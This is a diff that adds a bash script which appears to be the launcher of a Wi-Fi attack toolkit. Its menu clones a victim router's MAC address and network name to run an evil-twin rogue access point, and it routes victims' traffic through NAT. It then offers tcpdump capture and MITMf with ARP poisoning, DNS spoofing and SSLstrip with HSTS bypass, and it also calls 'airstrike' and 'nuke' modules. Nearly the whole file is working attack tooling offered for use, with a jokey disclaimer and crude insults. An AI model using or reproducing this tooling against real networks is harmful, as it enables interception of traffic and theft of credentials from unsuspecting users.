@@ -1,0 +1,200 @@
+#!/bin/bash
+
+#This script requires root to run
+#uid checks for root access
+#Rogue_AP is the hotspot
+#[+] Configuration
+#[!] Negative Information
+#[.] Positive Information
+#[-] Input
+
+uid=`id | cut -d '(' -f1 | cut -d '=' -f2`
+if [[ $uid  == '0' ]]; then	##not using posix-compatible single bracket for exceptions so as to use word-splitting and expansion
+
+	echo -e "\n`tput setaf 2;tput bold;`By Using this you Tool, you `tput setaf 3;`AGREE `tput setaf 2;`that I am not responsible for `tput setaf 3;`BURNT DEVICES, DEAD LAPTOPS
+THERMO-NUCLEAR WAR,`tput setaf 2;` or you getting teleported to `tput setaf 3;`BLACK HOLE.`tput setaf 2;` Please do some research if you
+have any concerns about features included in this Tool. Before Using, `tput setaf 3;`REMEMBER`tput setaf 2;` you are using
+this tool at `tput setaf 3;`YOUR OWN RISK`tput setaf 2;`, and if you point your finger at me for messing up your device,
+`tput setaf 3;`I WILL SIT BACK, DRINK REDBULL AND LAUGH AT YOU`tput setaf 7;`!!\n"
+
+	echo -e "Are you sure you want to use this tool?"
+	read -e -p ">>> (y/n) " -n2 accept; echo ""
+
+	if [[ $accept == 'y' ]]; then
+
+	        echo -e "`tput setaf 3;`[#]Choose What you want to do::\n"
+	        echo -e "[1] 3vil Twin"
+	        echo -e "[2] Go Rogue"
+		echo -e "[3] Trap House"
+		echo -e "[4] Launch Ballistic Missiles"
+		echo -e "`tput setaf 1;`[5] Nuke 'em All!!!"
+	        echo -e "`tput setaf 3;`[6] Execute Clean Slate Protocol"
+		echo -e "[x] Abort Mission\n`tput setaf 7;`"
+	        read -e -p "Enter ID>>> " -n2 ID
+
+	        if [[ $ID == '1'  ]];then
+#Choice 1
+			#Start Monitor Mode
+			echo -e "`tput setaf 3;`\n[+][+][+] Using wlan0 as the default adapter for AP..`tput setaf 7;`"
+			echo -e "`tput setaf 3;`[+][+][+] Starting Monitor mode on wlan0...`tput setaf 7;`"
+			ifconfig wlan0 down
+			iwconfig wlan0 mode monitor
+			ifconfig wlan0 up
+			airodump-ng wlan0 -w tempdump
+                        trap ctrl_c INT
+                        airmon-ng stop wlan0
+			ifconfig wlan0 up
+
+			#Cloning Access Point
+
+			echo -e "`tput setaf 3;`[-][-][-] Select Your Target or Type 'q' to Holster::`tput setaf 7;`"
+			cat tempdump-01.csv | awk -F "," '{ print $1$4$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | nl;echo ''
+			read -e -p ">>> " -n3 tempmacid
+
+			if [[ $tempmacid == 'q' ]]; then
+			        rm tempdump*
+			        exit
+			else
+				echo -e "`tput setaf 3;`\n[+][+][+] Cloning AP..This may take a while....`tput setaf 7;`"
+			        mac_id=`cat tempdump-01.csv | awk -F "," '{ print $1$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | awk 'NR=="'$tempmacid'"{ print $1 }'`
+				Rogue_AP=`cat tempdump-01.csv | awk -F "," '{ print $1$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | awk 'NR=="'$tempmacid'"' | cut -f2,3 -d " "`
+				rm tempdump*
+			fi;
+
+			echo -e "`tput setaf 3;`Using the exact same MAC-ID of the victim Router without DDoSing the victim may cause connectivity
+issues after creating the AP. Are you sure you want to continue? (Ignore if MAC-ID is different)`tput setaf 7;`"
+
+			read -e -p ">>> (y/n) " -n2 goahead
+
+			if [[ $goahead == 'y' ]]; then
+				ifconfig wlan0 down
+				macchanger -m $mac_id wlan0
+				iwconfig wlan0 mode monitor
+				ifconfig wlan0 up
+				echo -e "`tput setaf 3;`Enter the WiFi channel::`tput setaf 7;`"
+				read -e -p ">>> " -n3 chnl
+
+				iwconfig wlan0 channel $chnl
+			else
+				./piSociEty
+				exit
+			fi
+			#Configuring hostapd
+			bssid=`grep ssid /etc/hostapd/hostapd.conf | cut -d '=' -f2 | awk 'NR==1'`
+			sed -i "s/$bssid/$Rogue_AP/g" /etc/hostapd/hostapd.conf
+
+			#Starting Rogue AP
+#Choice 2
+		elif [[ $ID == '2' ]]; then
+			echo -e "`tput setaf 3;`[-][-][-]Enter New Rogue AP Name::`tput setaf 7;`"
+			read -e -p ">>> " -n15 Rogue_AP
+                        bssid=`grep ssid /etc/hostapd/hostapd.conf | cut -d '=' -f2 | awk 'NR==1{print $1}'`
+                        sed -i "s/$bssid/$Rogue_AP/g" /etc/hostapd/hostapd.conf
+
+#Choice 3
+		#Starting Rogue AP
+                elif [[ $ID == '3' ]]; then
+                        echo -e "`tput setaf 3;`[--]In Progress....[--]`tput setaf 7;`"
+			exit
+#Choice 4
+		#Launching Ballistic Missiles
+		elif [[ $ID == '4' ]]; then
+			cd modules
+			./airstrike
+			exit
+
+#Choice 5			
+		#Launching Nuke
+		elif  [[ $ID == '5' ]]; then
+			cd modules
+			./nuke
+			exit
+
+#Choice 6
+		#Execute Clean Slate Protocol
+		elif [[ $ID == '6'  ]]; then
+			modules/./clean_slate_protocol
+			exit
+		elif [[ $ID == 'x'  ]]; then
+			echo -e "`tput setaf 1;`\n[!][!][!]Mission Abort..Mission Abort...! Successful!!\n`tput setaf 7;`"
+			exit
+		else
+                        echo -e "`tput setaf 1;`\n[!][!][!]Invalid Entry! Do you even ENGLISH brah?\n`tput setaf 7;`"
+                        exit
+		fi;
+
+		echo -e "`tput setaf 3;`[+][+][+] Disabling Wifi dependencies...`tput setaf 7`"
+		airmon-ng check kill
+		service dnsmasq stop
+		service hostapd stop
+
+		echo -e "`tput setaf 3;`[+][+][+] Bringing wlan up.."
+		ifconfig wlan0 up
+
+		echo -e "`tput setaf 3;`[+][+][+] Setting Network 10.0.0.1/24.."
+		ifconfig wlan0 10.0.0.1/24
+
+		echo -e "`tput setaf 3;`[+][+][+] Setting Routing Tables using iptables...`tput setaf 7`"
+		iptables -t nat -F
+		iptables -F
+		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+		iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+
+		echo -e "`tput setaf 3;`[+][+][+] Forwarding port and IP.."
+		echo -e '1' > /proc/sys/net/ipv4/ip_forward
+
+		echo -e "`tput setaf 3;`[+][+][+] Starting Dnsmasq...`tput setaf 7`"
+		service dnsmasq restart
+		service dnsmasq status
+
+		echo -e "`tput setaf 3;`[+][+][+] Starting Hostapd...`tput setaf 7`"
+		service hostapd restart
+		service hostapd status
+
+		echo -e "`tput setaf 1;`[.][.][.] Your Rogue AP \n\n`tput setaf 2;figlet $Rogue_AP;tput setaf 1` \nis now active"
+		mate-terminal -x modules/./show_clients &
+
+		#Starting TCPDUMP
+		echo -e "`tput setaf 3;`[-][-][-] Do you want to start tcpdump?`tput setaf 7`"
+		read -e -p ">>> (y/n) " -n2 answer
+
+		if [[ $answer == 'y' ]]; then
+		        echo -e "`tput setaf 2;`[.][.][.] TcpDump Started on a new Console`tput setaf 7;`"
+			mate-terminal -x modules/./start_tcpdump &
+		elif [[ $answer == '' ]]; then
+		        echo -e "`tput setaf 3;`[!][!][!] You didn't say anything! Tcpdump Skipped..!\n`tput setaf 7;`"
+		else
+		        echo -e "`tput setaf 3;`[!][!][!] You said No...! TcpDump Skipped..!\n`tput setaf 7;`"
+		fi;
+
+		#Starting MitmF
+		echo -e "`tput setaf 3;`Do you want to start MitmF?`tput setaf 7`"
+		read -e -p ">>> (y/n) " -n2 answer2
+
+		if [[ $answer2 == 'y' ]]; then
+		        echo -e "`tput setaf 2;`[.][.][.] MitmF always Starts with the following defaults:::`tput setaf 7;`"
+	        	echo -e "[.] DNS Spoofing!"
+	        	echo -e "[.] ARP Poisoning!"
+	        	echo -e "[.] SSLStripv2 with HSTS Bypass!\n"
+			echo -e "`tput setaf 3;`[-] Please select the Gateway of the Router::\n`tput setaf 7`"
+			ifconfig | grep 'inet addr' | cut -d":" -f 2 | cut -d " " -f 1 | nl ;echo ''
+			read -e -p ">>> " -n2 reply
+			answer3=`ifconfig | grep 'inet addr' | cut -d":" -f 2 | awk 'NR=="'$reply'"{print $1}'`
+	        	cd modules/mitmf/
+	        	./mitmf.py -i wlan0 --arp --spoof --dns --hsts --gateway $answer3
+		elif [[ $answer2 == '' ]]; then
+	        	echo -e "`tput setaf 3;`[-][-][-] You didn't say anything! MitmF Skipped..!\n`tput setaf 7;`"
+		else
+	        	echo -e "`tput setaf 3;`[-][-][-] You said No...! MitmF Skipped..!"
+			echo -e "[!][!][!] Rogue AP will keep running until unless explicitly shut down by Clean Slate Protocol!!`tput setaf 7;`"
+		fi;
+
+	elif [[ $accept == 'n' ]]; then
+        	echo -e "`tput setaf 1;`\n[!][!][!] You are a Scared little Pussy! ain't ya?\n`tput setaf 7;`"
+	else
+        	echo -e "`tput setaf 1;`[x][x][x] Invalid Entry! Quitting..! [x][x][x]\n`tput setaf 7;`"
+	fi;
+
+else
+	echo -e "`tput setaf 1;`[?][?][?] Your Derp Level is Beyond Limits!\n`tput setaf 7;`"
+fi;
